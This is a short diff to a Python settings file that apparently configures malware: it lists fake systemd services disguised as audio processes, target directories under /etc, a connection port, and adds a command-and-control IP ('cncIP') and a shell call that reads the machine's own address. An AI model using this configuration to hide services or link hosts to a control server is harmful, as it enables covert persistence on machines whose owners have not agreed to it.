@@ -1,3 +1,5 @@
+from os import popen
+
 #settings if run as root
 root = {"ghostDir": "/etc/", "targetDir": "/etc/", "serviceDir": "/etc/systemd/system/"}
 
@@ -23,3 +25,5 @@ ghosts = [("audioProc", "audioProcessor", "provides audio control"),
 
 #data for connection
 port = 65432
+cncIP = "192.168.56.105"
+HOST = popen("ip -br a | grep UP | head -1 | awk '{print $3}'").read()[:-4]
